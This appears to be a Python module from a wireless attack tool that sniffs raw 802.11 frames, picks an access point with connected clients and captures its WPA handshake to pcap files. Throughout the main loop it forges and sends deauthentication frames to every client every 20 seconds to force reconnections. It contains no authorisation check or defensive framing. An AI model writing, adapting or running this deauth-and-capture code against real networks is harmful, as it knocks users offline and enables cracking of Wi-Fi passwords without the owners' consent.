import os
import time
import socket
from lib.Pcap import Pcap
from lib.Logger import Logger
from lib.Target import Target
from lib.Deauth import Deauth
from lib.APManager import APManager
from lib.AccessPoint import AccessPoint
from frames.Radiotap802_11 import Radiotap802_11

class WpaHandshakeGrabber():
    @staticmethod
    def getFrame(s):
        return s.recvfrom(2048)[0]

    @staticmethod
    def writePcap(pcap, packet_data):
        pcap.write(packet_data)
        pcap.pcap_file.flush()

    @staticmethod
    def startPcap(ap):
        ap_output_dir = './output/wpa_handshake/{}'.format(ap.mac)
        if not os.path.exists(ap_output_dir):
            os.mkdir(ap_output_dir)

        pcap_file = '{}/{}-{}.pcap'.format(ap_output_dir, ap.ssid, time.time())
        return Pcap(pcap_file)

    @staticmethod
    def updateUI(form, current_state, ap_manager):
        try:
            if current_state == 'scanning':
                form.status_text.value = "Looking for an AP with active users"
                form.ap_list.values = ap_manager.getPrettyAPList()
            elif current_state == 'ap_locked':
                form.ap_list.values = ap_manager.locked_ap.getPrettyTargetList()
                form.ap_list.value = ap_manager.locked_ap.targets
            form.display()
        except:
            pass

    @staticmethod
    def switchToLockedTargetView(form, ssid):
        form.status_text.value = "Locked onto AP {}".format(ssid)
        form.ap_list.values = []


    @staticmethod
    def run(form):
        form.status_text.value = "Looking for an AP with active users"

        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind((form.interface, 0x0003))

        mac_collected = []

        ap_manager = APManager()
        current_state = 'scanning'

        pcap_file = None
        
        last_deauth = None

        while True:
            packet = WpaHandshakeGrabber.getFrame(s)
            frame = Radiotap802_11(packet)

            if current_state == 'scanning':
                if frame.isBeaconFrame():
                    ap = AccessPoint(frame.ssid, frame.channel, frame.bssid_id)
                    ap_manager.addAP(ap)
                elif frame.isAckBlockFrame(): # duplicat below move above
                    target = Target(frame.destination)
                    ap_manager.addTarget(target, frame.source)

                if ap_manager.update() and frame.source not in mac_collected:
                    current_state = 'ap_locked'
                    pcap_file = WpaHandshakeGrabber.startPcap(ap_manager.locked_ap)
                    WpaHandshakeGrabber.switchToLockedTargetView(form, ap_manager.locked_ap.ssid)
            elif current_state == 'ap_locked':
                if frame.isAckBlockFrame(): # change this to top like above
                    target = Target(frame.destination)
                    ap_manager.addTarget(target, frame.source)

                if ap_manager.locked_ap is not None and frame.isQOSFrame() and len(packet) == 163 and frame.source == ap_manager.locked_ap.mac:
                    Logger.log('Handshake Found on {}'.format(ap_manager.locked_ap.ssid))
                    current_state = 'scanning'
                    mac_collected.append(ap_manager.locked_ap.mac)
                    ap_manager.locked_ap = None
                    continue
                
                WpaHandshakeGrabber.writePcap(pcap_file, packet)
                if last_deauth is None or time.time() - last_deauth > 20:
                    last_deauth = time.time()

                    for target in ap_manager.locked_ap.targets:
                        deauth_frame = Deauth.getDeauthFrame(ap_manager.locked_ap, target)
                        WpaHandshakeGrabber.writePcap(pcap_file, deauth_frame)
                        s.send(deauth_frame)
            
            WpaHandshakeGrabber.updateUI(form, current_state, ap_manager)